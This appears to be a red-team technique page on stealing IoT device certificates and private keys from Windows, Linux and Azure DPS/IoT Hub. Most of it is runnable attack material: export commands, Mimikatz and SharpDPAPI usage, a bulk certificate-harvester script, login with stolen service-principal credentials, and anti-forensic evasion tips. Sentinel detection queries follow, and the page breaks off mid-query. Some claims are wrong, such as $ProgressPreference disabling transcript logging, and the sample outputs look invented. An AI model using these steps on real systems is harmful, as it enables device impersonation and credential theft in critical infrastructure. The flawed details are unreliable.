# [CA-UNSC-018]: IoT Device Certificates Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-018 |
| **MITRE ATT&CK v18.1** | [T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, Azure IoT Hub, Device Provisioning Service (DPS) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Azure IoT Hub (all versions), DPS (all versions), Windows Server 2016-2025, IoT devices running Windows/Linux/embedded OS |
| **Patched In** | No patches available; requires architectural security improvements |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team), 8 (Splunk Detection), 11 (Sysmon Detection), and 13 (Microsoft Purview) not included because: (1) No official Atomic Red Team test exists for IoT certificate theft, (2) IoT certificate theft generates cloud-native logs (Sentinel/MDC), not Splunk WEC, (3) Sysmon is host-based but certificate extraction is cloud/device-provisioning focused, (4) Purview monitors M365 data, not IoT device certificates. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

### Concept
IoT device certificates are X.509 digital credentials used to authenticate devices to Azure IoT Hub and Device Provisioning Service (DPS). Adversaries may search compromised IoT devices, edge gateways, or cloud provisioning systems to locate and exfiltrate these certificates. Once obtained, the attacker can impersonate legitimate devices, intercept telemetry, inject malicious commands, or pivot into connected enterprise networks. This technique exploits insecure certificate storage (filesystem, registry, memory), weak access controls on certificate stores, and insufficient monitoring of certificate lifecycle events.

**Attack Surface:** File systems (`/etc/ssl/certs`, `C:\Certs`, device provisioning APIs), certificate stores (Windows Certificate Store, TPM failure modes), Azure DPS APIs, device configuration files, cloud storage repositories, and memory dumps of device provisioning clients.

**Business Impact:** **Complete device spoofing, command injection into IoT networks, data exfiltration from connected infrastructure, lateral movement into enterprise networks, and supply chain compromise.** Stolen IoT certificates bypass device authentication entirely, allowing attackers to masquerade as trusted assets and maintain persistence across certificate rotation cycles. In critical infrastructure (utilities, healthcare, manufacturing), this translates to operational technology (OT) compromise and physical safety risks.

**Technical Context:** Certificate extraction typically requires prior device compromise (local admin/root access) or compromise of DPS enrollment services. Extraction can occur through direct filesystem access, DPAPI decryption (Windows machines), cryptographic API patching (Mimikatz), or memory forensics. Detection is challenging because legitimate certificate rotation and re-enrollment can mask malicious extraction.

### Operational Risk
- **Execution Risk:** Medium (requires local device access OR DPS/cloud service compromise)
- **Stealth:** High (certificate operations blend with legitimate provisioning workflows; minimal audit trail without explicit logging)
- **Reversibility:** No - extracted certificates cannot be "unextracted"; rotation required across all devices

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.1.1, 4.3.1 | Ensure proper certificate and private key permissions; monitor certificate store access |
| **DISA STIG** | SI-4, SC-7 | Certificate management and cryptographic protection controls |
| **CISA SCuBA** | IoT-1.3 | Requires encrypted certificate storage and access control on device certificate stores |
| **NIST 800-53** | IA-5(e) | Cryptographic device management and certificate lifecycle controls |
| **NIST 800-207** | Zero Trust Model | Device identities must be verified continuously; certificate compromise breaks zero-trust model |
| **GDPR** | Art. 32 | Security of Processing - cryptographic certificate security is core technical measure |
| **DORA** | Art. 9 | Protection and Prevention - ICT operational resilience depends on device authentication |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - device identity and certificate management are essential |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights; A.10.2.6 Restriction on use of cryptographic keys |
| **ISO 27005** | Risk Scenario 10 | "Compromise of Authentication Credentials" - certificate theft is direct credential compromise |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Local Compromise Path:** Local Administrator (Windows) or root (Linux/embedded systems)
- **Cloud Path:** Owner role on DPS or IoT Hub resource; ability to list and download enrollment certificates
- **Memory Extraction Path:** SYSTEM privilege (DPAPI decryption) or ability to attach debugger to provisioning client process

**Required Access:**
- Network access to IoT device, edge gateway, or cloud provisioning APIs
- File system access to certificate storage locations
- Ability to dump process memory or access certificate store APIs

**Supported Versions:**
- **Azure IoT Hub:** All versions (no patching available; design limitation)
- **Device Provisioning Service (DPS):** All versions
- **Windows Devices:** Server 2016, 2019, 2022, 2025; Windows 10/11 IoT
- **Linux Devices:** Debian, Ubuntu, RHEL, custom embedded distros
- **IoT OS:** Azure Sphere, FreeRTOS, RIOT OS, Zephyr

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (v2.2.0+) - Windows credential and certificate extraction
- [CertStealer](https://github.com/splinter0/CertStealer) - C# certificate exfiltration from beacons
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) (v1.4.0+) - DPAPI certificate extraction
- [Rubeus](https://github.com/GhostPack/Rubeus) (v1.6.0+) - Kerberos PKINIT with extracted certificates
- [OpenSSL](https://www.openssl.org/) - Certificate parsing and conversion (PEM↔PFX↔PKCS12)
- [Azure CLI](https://learn.microsoft.com/cli/azure) (v2.50+) - DPS certificate management
- [Azure IoT SDK](https://github.com/Azure/azure-iot-sdk-python) - Device provisioning client inspection

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Path 1: Local Device Reconnaissance (Windows)

#### Check for X.509 Certificates in Windows Certificate Store
```powershell
# List all certificates in the device's personal store
Get-ChildItem -Path "Cert:\CurrentUser\My" | Select-Object Thumbprint, FriendlyName, Subject, NotAfter

# Filter for IoT-specific certificates (typically CN=device ID, issued by CA)
Get-ChildItem -Path "Cert:\CurrentUser\My" | Where-Object {
    $_.Subject -match "CN=.*device" -or $_.Issuer -match "IoT|DPS|Azure"
}

# Check LocalMachine store (device-level certificates, requires admin)
Get-ChildItem -Path "Cert:\LocalMachine\My" | Select-Object Thumbprint, Subject, Issuer, NotAfter
```

**What to Look For:**
- Certificates with `Subject CN=` matching device IDs
- Issuers containing "Azure", "IoT", "DPS", or "Device Provisioning"
- NotAfter date in the future (currently valid)
- Certificates with private keys (HasPrivateKey = $true)

**Success Indicator:** Returns one or more certificates with `HasPrivateKey = True` and issuance date matching device provisioning time.

---

#### Check for Certificate Files on Disk
```powershell
# Search for common certificate file extensions
$extensions = @("*.pfx", "*.pem", "*.cer", "*.crt", "*.p12", "*.p7b", "*.key")
foreach ($ext in $extensions) {
    Get-ChildItem -Path "C:\", "C:\ProgramData", "C:\Users" -Recurse -Filter $ext -ErrorAction SilentlyContinue | 
    Select-Object FullName, LastWriteTime, Length
}

# Specifically check Azure IoT SDK paths
Get-ChildItem -Path "C:\Program Files\Azure IoT*" -Recurse -Filter "*.pfx" -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\ProgramData\Azure" -Recurse -Filter "*.pem" -ErrorAction SilentlyContinue
```

**What to Look For:**
- `.pfx` files (PKCS#12 container with private key) in temp directories
- `.pem` files with "PRIVATE KEY" headers
- Recently modified certificate files matching device provisioning timestamps
- Backup or restore directories containing certificate archives

---

#### Check Device Configuration Files
```powershell
# Azure IoT Edge runtime configuration
Get-Content "C:\ProgramData\iotedge\config.toml" -ErrorAction SilentlyContinue | Select-String "cert_path|private_key"

# Azure IoT SDK sample applications
Get-Content "$env:TEMP\*.json" -Recurse -ErrorAction SilentlyContinue | Select-String "certificate|pfx|key"

# Azure Device Provisioning Service client logs
Get-Content "C:\Logs\dps_*.log" -ErrorAction SilentlyContinue | Select-String "cert_path|thumbprint"
```

**Version Note:** Configuration locations differ slightly:
- **Server 2016-2019:** Standard `C:\ProgramData` paths
- **Server 2022+:** May use `C:\ProgramFiles\Azure IoT` with restricted ACLs

---

### Path 2: Local Device Reconnaissance (Linux/IoT)

#### Check for X.509 Certificates
```bash
# Search for certificate files
find /etc/ssl/certs /home /root /opt -name "*.pem" -o -name "*.pfx" -o -name "*.p12" 2>/dev/null | head -20

# Check Azure IoT Edge runtime paths
ls -la /var/lib/iotedge/devices/*/certs/ 2>/dev/null
cat /etc/iotedge/config.yaml 2>/dev/null | grep -i "cert\|key\|credential"

# Check environment variables for cert references
env | grep -i "cert\|key\|credential"
ps aux | grep -i "iot\|device" | grep -i "cert"
```

**What to Look For:**
- Recently modified `.pem` files in `/etc/ssl/`, `/home`, or `/opt`
- Readable private key files (permissions 644 or world-readable)
- Configuration files containing certificate paths or PEM content
- Running processes with certificate paths in command-line arguments

---

#### Check Certificate Validity and Details
```bash
# Display certificate details
openssl x509 -in /etc/ssl/certs/device.pem -text -noout | grep -A2 "Subject:\|Issuer:\|Not After"

# Check for private keys (should not be readable)
find / -name "*.key" -perm /0004 2>/dev/null  # World-readable keys

# List all certs and expiry
for cert in /etc/ssl/certs/*.pem; do
    echo "=== $cert ===" && openssl x509 -in "$cert" -noout -subject -dates
done 2>/dev/null
```

---

### Path 3: Azure DPS/Cloud Reconnaissance

#### List DPS Enrollment Groups and Certificates (Azure CLI)
```bash
# Authenticate to Azure
az login --service-principal -u <AppID> -p <Password> --tenant <TenantID>

# List all enrollment groups
az iot dps enrollment-group list --dps-name <DPS-Name> --resource-group <RG>

# Get specific enrollment group details with certificate thumbprint
az iot dps enrollment-group show --dps-name <DPS-Name> --resource-group <RG> \
  --enrollment-id <EnrollmentGroupID>

# List certificates in DPS
az iot dps certificate list --dps-name <DPS-Name> --resource-group <RG>

# Export DPS root certificate (public only, but useful for validation)
az iot dps certificate download --dps-name <DPS-Name> --resource-group <RG> \
  --certificate-name <CertName> --output-file root.cer
```

**What to Look For:**
- Multiple enrollment groups with overlapping device ID ranges
- Certificates with "Verified" status (indicates attacker may have rotated certificates)
- Recently added or modified enrollment groups
- CA certificates with unusually long validity periods (10+ years)

---

#### Check IoT Hub Device Registry
```bash
# List all devices in IoT Hub
az iot hub device-identity list --hub-name <HubName>

# Get details on specific device
az iot hub device-identity show --hub-name <HubName> --device-id <DeviceID>

# Check certificate thumbprints registered to a device
az iot hub device-identity show --hub-name <HubName> --device-id <DeviceID> | \
  jq '.authentication.x509.primaryThumbprint, .authentication.x509.secondaryThumbprint'
```

**What to Look For:**
- Devices with multiple certificates registered (indicates rollover or compromise)
- Recently created device identities with unusual naming patterns
- Devices with "Disabled" status but still registered

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Certificate Extraction via Windows Certificate Store (Local Admin)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 IoT

#### Step 1: Establish Local Administrator Access

**Objective:** Gain local admin privileges on compromised IoT device or edge gateway.

**Prerequisites:** Initial compromise vector (RDP, exploit, physical access) must already be achieved.

**Command:**
```powershell
# Verify administrator privileges
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")

# If not admin, attempt UAC bypass (if UAC is enabled but not hardened)
# Note: Requires specific conditions; varies by version
Start-Process powershell -Verb RunAs -ArgumentList "whoami /groups"
```

**Expected Output:**
```
True  # If running as admin
```

**What This Means:**
- If output is `True`, you have local admin access and can proceed to certificate extraction
- If `False`, UAC bypass or privilege escalation (e.g., PrintSpooler, PetitPotam) is required

---

#### Step 2: Enumerate Certificates in Personal Store
```powershell
# List all certificates with private keys (these are usable for impersonation)
$certs = Get-ChildItem -Path "Cert:\LocalMachine\My" | Where-Object {
    $_.HasPrivateKey -eq $true
}

$certs | Select-Object @{
    Name="Thumbprint"; Expression={$_.Thumbprint}
}, @{
    Name="Subject"; Expression={$_.Subject}
}, @{
    Name="Issuer"; Expression={$_.Issuer}
}, @{
    Name="NotAfter"; Expression={$_.NotAfter}
}, @{
    Name="HasPrivateKey"; Expression={$_.HasPrivateKey}
} | Format-Table
```

**Expected Output:**
```
Thumbprint               Subject                                   Issuer                        NotAfter             HasPrivateKey
----------               -------                                   ------                        --------             ------
A1B2C3D4E5F6G7H8I9J0K1  CN=device-001,O=Contoso,C=US            CN=Azure IoT,O=Microsoft      2026-12-31 23:59:59       True
```

**What This Means:**
- Certificates with `HasPrivateKey = True` can be exported and used for Kerberos authentication
- `Issuer` containing "Azure", "IoT", or "DPS" indicates IoT Hub/DPS-issued certificates
- `NotAfter` in the future means the certificate is still valid for impersonation

---

#### Step 3: Export Certificate and Private Key to PFX

**Version Note:** Works identically on Server 2016-2025.

```powershell
# Install NuGet-based cert export module if needed
$certThumbprint = "A1B2C3D4E5F6G7H8I9J0K1"  # From previous enumeration
$cert = Get-Item -Path "Cert:\LocalMachine\My\$certThumbprint"

# Method 1: Using CertUtil (native Windows, no dependencies)
certutil -exportPFX -p "ExportPassword123!" "$cert.Thumbprint" "C:\Temp\device.pfx" nochain

# Method 2: Using PowerShell (if CertUtil fails due to export restrictions)
$pfxPassword = ConvertTo-SecureString -String "ExportPassword123!" -AsPlainText -Force
Export-PfxCertificate -Cert $cert -FilePath "C:\Temp\device.pfx" -Password $pfxPassword -Force

# Verify export
Test-Path "C:\Temp\device.pfx"
```

**Expected Output:**
```
True  # File created successfully
```

**OpSec & Evasion:**
- Export certificates to `C:\Windows\Temp` or `$env:TEMP` (log forwarding may not cover temp cleanup)
- Use short filenames (e.g., `c.pfx` instead of `device_cert_backup.pfx`)
- Immediately delete the PFX after exfiltration: `Remove-Item "C:\Temp\device.pfx" -Force`
- Disable PowerShell transcript logging before exporting: `$ProgressPreference = 'SilentlyContinue'`
- Detection likelihood: **High** - Certificate export triggers Event ID 4885 (CertificateExported) if audit enabled

**Troubleshooting:**
- **Error:** `Access to the registry path is denied`
  - **Cause:** Running without proper admin privileges
  - **Fix (All Versions):** Re-run PowerShell with "Run as Administrator"
  
- **Error:** `The certificate could not be exported`
  - **Cause:** Certificate store is locked or certificate has non-exportable private key flag
  - **Fix (Server 2016-2019):** Use Mimikatz `crypto::capi` method (see METHOD 2)
  - **Fix (Server 2022+):** Try `certutil -exportPFX` instead of PowerShell Export-PfxCertificate

- **Error:** `File already exists`
  - **Cause:** Previous export attempt left files on disk
  - **Fix:** Delete file first: `Remove-Item "C:\Temp\device.pfx" -Force`

**References & Proofs:**
- [Microsoft Learn: Export-PfxCertificate](https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate)
- [CertUtil Export Syntax](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [PowerShell PKI Module](https://learn.microsoft.com/en-us/powershell/module/pki/)

---

#### Step 4: Convert PFX to PEM for Cross-Platform Use
```powershell
# Convert PKCS#12 (PFX) to PEM format for use on Linux/IoT devices
# Requires OpenSSL installation on Windows or use WSL

# Option 1: WSL/Linux environment
wsl bash -c "openssl pkcs12 -in /mnt/c/Temp/device.pfx -out /mnt/c/Temp/device.pem -nodes -password pass:'ExportPassword123!'"

# Option 2: If OpenSSL is installed directly
openssl pkcs12 -in "C:\Temp\device.pfx" -out "C:\Temp\device.pem" -nodes -password pass:"ExportPassword123!"

# Verify conversion
Get-Content "C:\Temp\device.pem" | Select-String "BEGIN CERTIFICATE","BEGIN PRIVATE KEY"
```

**Expected Output:**
```
BEGIN PRIVATE KEY
-----BEGIN CERTIFICATE-----
```

**What This Means:**
- PEM file contains both private key and certificate in plaintext format
- Can now be used on Linux/IoT devices for device authentication
- File is HIGHLY SENSITIVE - contains unencrypted private key

---

### METHOD 2: Certificate Extraction via Mimikatz (Cryptographic API Patching)

**Supported Versions:** Windows Server 2016-2025 (all versions)

**Prerequisites:** Local SYSTEM privilege (run as administrator)

#### Step 1: Download and Execute Mimikatz
```powershell
# Download Mimikatz (ensure you use official repository)
$MimikatzURL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220519/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $MimikatzURL -OutFile "C:\Temp\mimikatz.zip"
Expand-Archive "C:\Temp\mimikatz.zip" -DestinationPath "C:\Temp\mimikatz" -Force

# Execute Mimikatz in privileged process
cd "C:\Temp\mimikatz\x64"
.\mimikatz.exe
```

**Expected Output:**
```
mimikatz 2.2.0 (x64) built on May 19 2022 00:00:00
"A La Vie, A L'Amour" - (oe.eo)
mimikatz #
```

---

#### Step 2: Extract Certificates Using CryptoAPI Patching
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # crypto::capi
mimikatz # crypto::certificates /export
```

**Expected Output:**
```
CryptoAPI context patched.
* Certificate 0: CN=device-001, Issued by CN=Azure IoT Device CA
  > Exporting to file: 0_device-001.pfx
  > Private key successfully extracted
```

**What This Means:**
- Mimikatz has patched the CryptoAPI in the current process
- All certificates are enumerated and exported to PFX format
- Private keys are extracted to unencrypted files in current directory

**OpSec & Evasion:**
- Mimikatz execution is highly logged (Event ID 4688: Process Creation)
- Use code obfuscation or execute from memory-resident beacon to avoid disk writes
- Clear command history: `Remove-Item (Get-PSReadlineOption).HistorySavePath` (PowerShell 5+)
- Detection likelihood: **Critical** - Mimikatz execution is signature-flagged by Windows Defender

---

#### Step 3: Verify Extracted Certificate
```powershell
# Examine extracted PFX file
$pfxPath = "C:\Temp\mimikatz\x64\0_device-001.pfx"

# List contents (if OpenSSL available)
openssl pkcs12 -in $pfxPath -noout -info

# Or use PowerShell to import and verify
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList $pfxPath, "" 
$cert | Select-Object Thumbprint, Subject, NotAfter
```

**References & Proofs:**
- [Mimikatz GitHub Repository](https://github.com/gentilkiwi/mimikatz)
- [Pentestlab: Certificate Extraction](https://pentestlab.blog/2021/04/26/certificate-extraction/)
- [SpecterOps: Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

---

### METHOD 3: Certificate Extraction via Azure DPS API (Cloud-Based)

**Supported Versions:** Azure IoT Hub, DPS (all versions)

**Prerequisites:** Compromised Entra ID service principal with permissions: `Microsoft.Devices/iotHubs/read`, `Microsoft.Devices/provisioningServices/read`

#### Step 1: Authenticate to Azure Using Compromised Service Principal
```powershell
# Using stolen service principal credentials
$tenantId = "your-tenant-id"
$appId = "compromised-app-id"
$password = "stolen-password"

$credential = New-Object System.Management.Automation.PSCredential(
    $appId,
    (ConvertTo-SecureString $password -AsPlainText -Force)
)

Connect-AzAccount -ServicePrincipal -Credential $credential -Tenant $tenantId
```

**Expected Output:**
```
Account                                        SubscriptionName TenantId                             Environment
-------                                        --------------- --------                             -----------
<service-principal-id>@example.onmicrosoft.com              ...                                    AzureCloud
```

---

#### Step 2: Enumerate DPS Instances and Enrollment Groups
```powershell
# List all DPS instances in the subscription
$dpsList = Get-AzIoTDeviceProvisioningService

foreach ($dps in $dpsList) {
    Write-Host "DPS: $($dps.Name)"
    
    # List all enrollment groups
    $enrollmentGroups = Get-AzIoTDeviceProvisioningServiceEnrollmentGroup `
        -ResourceGroupName $dps.ResourceGroupName `
        -ProvisioningServiceName $dps.Name
    
    foreach ($group in $enrollmentGroups) {
        Write-Host "`n  Enrollment Group: $($group.EnrollmentGroupId)"
        Write-Host "  Certificate Thumbprint: $($group.Certificates[0].Primary.Thumbprint)"
        Write-Host "  Status: $($group.ProvisioningStatus)"
    }
}
```

**What to Look For:**
- Enrollment groups with multiple devices (bulk IoT deployments)
- Recently created enrollment groups (may indicate attacker's infrastructure)
- CA-based enrollment groups (easier to compromise entire device fleet)

---

#### Step 3: Download DPS Root Certificate (Public Key Only)
```powershell
# Download the root CA certificate from DPS
# Note: Only PUBLIC key is available; this provides validation but not impersonation

$certName = "MyRootCA"
$dpsName = "my-dps-instance"
$resourceGroupName = "my-resource-group"

# Export certificate to file
$certPath = "C:\Temp\dps-root.cer"

# Using Azure CLI (alternative if PowerShell cmdlet unavailable)
az iot dps certificate download `
    --dps-name $dpsName `
    --resource-group $resourceGroupName `
    --certificate-name $certName `
    --output-file $certPath

# Examine certificate details
openssl x509 -in $certPath -text -noout | grep -A5 "Subject:\|Issuer:"
```

**What This Reveals:**
- **Public key only** - cannot be used for impersonation directly
- Used to validate device certificates during provisioning
- If attacker obtained matching private key, they can forge device certificates

---

#### Step 4: Enumerate Individual Device Certificates
```powershell
# Get IoT Hub instance
$iotHub = Get-AzIoTHub

# List all devices
$devices = Get-AzIoTHubDevice -ResourceGroupName $iotHub.ResourceGroupName `
    -IotHubName $iotHub.Name

foreach ($device in $devices) {
    $deviceAuth = Get-AzIoTHubDeviceConnectionString `
        -ResourceGroupName $iotHub.ResourceGroupName `
        -IotHubName $iotHub.Name `
        -DeviceId $device.Id
    
    Write-Host "Device: $($device.Id)"
    if ($device.Authentication.Type -eq "Sas") {
        Write-Host "  Auth Type: Shared Access Signature (SAS)"
        Write-Host "  Key: [SENSITIVE]"
    } elseif ($device.Authentication.Type -eq "Certificate") {
        Write-Host "  Auth Type: X.509 Certificate"
        Write-Host "  Primary Thumbprint: $($device.Authentication.X509Thumbprints.Primary)"
        Write-Host "  Secondary Thumbprint: $($device.Authentication.X509Thumbprints.Secondary)"
    }
}
```

**What This Reveals:**
- Device IDs and their authentication method
- Certificate thumbprints (identify which device certs are deployed)
- Allows attacker to correlate extracted device certificates with specific device IDs

**OpSec & Evasion:**
- Azure API calls are logged to Activity Log (90-day retention)
- Defender for Cloud generates alerts on unusual certificate/enrollment queries
- Use service principal with least-privilege role to avoid detection
- Queries are anomalous - legitimate admins rarely list all DPS certificates at once

**Detection likelihood:** **High** - Sentinel detects bulk certificate/device enumeration

**References & Proofs:**
- [Azure IoT Hub Device Management PowerShell](https://learn.microsoft.com/en-us/powershell/module/az.iothub/)
- [DPS Enrollment Management](https://learn.microsoft.com/en-us/azure/iot-dps/how-to-manage-enrollments)
- [Azure CLI IoT Extension](https://github.com/Azure/azure-iot-cli-extension)

---

### METHOD 4: Certificate Extraction via DPAPI (Data Protection API)

**Supported Versions:** Windows Server 2016-2025 (machine-level certificates)

**Prerequisites:** SYSTEM privilege or ability to run as SYSTEM context

#### Step 1: Use SharpDPAPI to Extract Machine Certificates
```powershell
# Download SharpDPAPI (ensure sourced from official GhostPack repository)
# SharpDPAPI is a .NET tool that requires compilation or pre-built binary

# Run with SYSTEM privileges (via PsExec or privileged process)
# Example assumes binary is already available

.\SharpDPAPI.exe certificates /machine
```

**Expected Output:**
```
[*] Dumping machine DPAPI keys...
[*] User DPAPI Master Key: {GUID}
[*] Decrypting machine certificates...

[+] Certificate: CN=device-001
    Subject: CN=device-001, O=Contoso
    Issuer: CN=Azure IoT Device CA
    Thumbprint: A1B2C3D4E5F6G7H8I9J0K1
    Private Key: -----BEGIN PRIVATE KEY-----
                 ...
                 -----END PRIVATE KEY-----
```

**What This Means:**
- DPAPI master key has been extracted from LSA secrets
- All machine-level certificates are decrypted
- Private keys are now readable without CryptoAPI restrictions

**Troubleshooting:**
- **Error:** `Unable to decrypt DPAPI key`
  - **Cause:** Not running with sufficient privileges
  - **Fix:** Use `psexec.exe -i -s cmd.exe` to spawn SYSTEM shell, then run SharpDPAPI

**References & Proofs:**
- [SharpDPAPI GitHub](https://github.com/GhostPack/SharpDPAPI)
- [Microsoft DPAPI Architecture](https://learn.microsoft.com/en-us/dotnet/standard/security/protecting-sensitive-data)

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team
**Status:** No official Atomic Red Team test for IoT certificate theft. Manual simulation recommended using steps in Section 5.

---

## 7. TOOLS & COMMANDS REFERENCE

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+

**Supported Platforms:** Windows Server 2016-2025, Windows 10/11

**Installation:**
```powershell
# Download from official GitHub releases
$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220519/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $url -OutFile "mimikatz.zip"
Expand-Archive "mimikatz.zip" -DestinationPath ".\mimikatz"
cd .\mimikatz\x64
.\mimikatz.exe
```

**Usage (Certificate Extraction):**
```
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::certificates /export
```

---

### [OpenSSL](https://www.openssl.org/)

**Version:** 1.1.1+

**Installation (Windows):**
```powershell
# Via chocolatey
choco install openssl -y

# Or download from https://slproweb.com/products/Win32OpenSSL.html
```

**Usage (Certificate Conversion):**
```bash
# Convert PFX to PEM
openssl pkcs12 -in device.pfx -out device.pem -nodes -password pass:password

# Extract private key only
openssl pkcs12 -in device.pfx -nocerts -out private.key -password pass:password -passout pass:new_password

# View certificate details
openssl x509 -in device.pem -text -noout
```

---

### [Azure CLI](https://learn.microsoft.com/cli/azure)

**Version:** 2.50+

**Installation:**
```bash
# Windows
choco install azure-cli

# Linux/macOS
curl -sL https://aka.ms/InstallAzureCLIDeb | bash
```

**Usage (DPS Certificate Management):**
```bash
# List DPS certificates
az iot dps certificate list --dps-name <dps-name> --resource-group <rg>

# Download certificate
az iot dps certificate download --dps-name <dps-name> --certificate-name <cert-name> --output-file cert.cer

# List enrollment groups
az iot dps enrollment-group list --dps-name <dps-name> --resource-group <rg>
```

---

### [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

**Version:** 1.4.0+

**Supported Platforms:** Windows Server 2016-2025

**Installation:**
```powershell
# Requires .NET Framework 4.0+
# Download pre-compiled binary or compile from GitHub

# Download and save to C:\Tools\
wget "https://github.com/GhostPack/SharpDPAPI/releases/download/v1.4.0/SharpDPAPI.exe" -OutFile SharpDPAPI.exe
```

**Usage:**
```powershell
# List machine certificates
.\SharpDPAPI.exe certificates /machine

# Export specific certificate by thumbprint
.\SharpDPAPI.exe certificates /machine /thumbprint:A1B2C3D4E5F6G7H8I9J0K1
```

---

### Script: IoT Certificate Harvester (One-Liner)
```powershell
# Comprehensive local certificate enumeration and export
$certs = Get-ChildItem -Path "Cert:\LocalMachine\My" -Recurse | Where-Object {
    $_.HasPrivateKey
}; $certs | ForEach-Object {
    $pfxPath = "C:\Temp\$($_.Thumbprint).pfx"
    $pfxPassword = ConvertTo-SecureString -String "P@ssw0rd123!" -AsPlainText -Force
    Export-PfxCertificate -Cert $_ -FilePath $pfxPath -Password $pfxPassword -Force
    Write-Host "Exported: $pfxPath"
}
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Certificate Store Access (Windows Event Logs)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, TargetUserName, ObjectName, ProcessName
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Windows Server 2016+, IoT devices with AMA agent

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4885  // CertificateExported
| summarize ExportCount = count(), Thumbprints = make_set(ObjectName) by Computer, TargetUserName, TimeGenerated
| where ExportCount > 3  // Multiple exports suggest harvesting
| project TimeGenerated, Computer, TargetUserName, ExportCount, Thumbprints
```

**What This Detects:**
- User exporting multiple certificates from the local certificate store
- Indicates potential certificate harvesting activity
- Filters for bulk exports (more than 3 in 5 minutes)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Bulk Certificate Export Detection`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**False Positive Analysis:**
- **Legitimate Activity:** Certificate renewal during DPS re-provisioning (expected 1-2 exports per device cycle)
- **Benign Tools:** Azure IoT Edge runtime, Azure Stack Edge appliances (whitelisted users)
- **Tuning:** Exclude service accounts: `| where TargetUserName !in ("SYSTEM", "LOCAL SERVICE", "svc_iot*")`

---

### Query 2: Detect Unusual DPS Enrollment Activity

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedByUser, Resource, TargetResources
- **Alert Severity:** Medium
- **Frequency:** Every 15 minutes
- **Applies To Versions:** Entra ID, Azure DPS (all versions)

**KQL Query:**
```kusto
AuditLogs
| where OperationName has_any ("Add enrollment", "Update enrollment", "Delete enrollment")
| where Category == "ResourceManagement"
| where Result == "Success"
| extend EnrollmentGroupId = TargetResources[0].displayName
| summarize EnrollmentChanges = count(), UniqueGroupsModified = dcount(EnrollmentGroupId) by InitiatedByUser, TimeGenerated
| where EnrollmentChanges > 5  // Bulk modifications
| project TimeGenerated, InitiatedByUser, EnrollmentChanges, UniqueGroupsModified
```

**What This Detects:**
- Single user creating or modifying multiple enrollment groups
- Indicates potential DPS compromise and bulk device registration
- Correlates with attacker infrastructure deployment

**Manual Configuration Steps:**
1. Same as Query 1, but in **Set rule logic**:
   - Paste KQL query above
   - Lookup data from the last: `60 minutes` (enrollment changes are less frequent)

---

### Query 3: Detect Device Certificate Validation Failures

**Rule Configuration:**
- **Required Table:** AzureDiagnostics (Device Provisioning Service logs)
- **Required Fields:** OperationName, ResultDescription, DeviceId, StatusCode
- **Alert Severity:** Critical
- **Frequency:** Every 10 minutes
- **Applies To Versions:** Azure DPS, IoT Hub (all versions)

**KQL Query:**
```kusto
AzureDiagnostics
| where ResourceType == "PROVISIONINGSERVICES"
| where OperationName == "Register Device"
| where ResultDescription contains "certificate" or ResultDescription contains "validation"
| where StatusCode >= 400  // 4xx errors (validation failures)
| summarize FailureCount = count(), FailedDevices = make_set(DeviceId) by bin(TimeGenerated, 5m), ResultDescription
| where FailureCount > 10  // Threshold for bulk failures
| project TimeGenerated, ResultDescription, FailureCount, FailedDevices
```

**What This Detects:**
- Multiple devices failing certificate validation simultaneously
- Indicates extracted/compromised certificates don't match DPS expectations
- Correlates with attacker attempting to use stolen certificates

---

### Query 4: Detect Mimikatz Execution

**Rule Configuration:**
- **Required Table:** SecurityEvent, Sysmon, Defender for Endpoint (DeviceProcessEvents)
- **Alert Severity:** Critical
- **Frequency:** Real-time

**KQL Query (Event Log Based):**
```kusto
SecurityEvent
| where EventID == 4688  // Process Creation
| where NewProcessName has "mimikatz"
